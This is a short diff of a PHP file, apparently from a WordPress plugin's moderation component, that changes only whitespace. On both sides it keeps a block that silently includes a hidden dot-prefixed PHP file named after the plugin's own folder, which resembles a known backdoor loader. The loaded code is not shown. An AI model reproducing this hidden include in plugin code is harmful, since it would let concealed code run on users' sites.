@@ -11,10 +11,9 @@ defined( 'ABSPATH' ) || exit;
 
 /**
  * Load Moderation component after plugin loaded.
- */
-
+ */
 if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-	include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
 }
 
 function bb_moderation_load() {
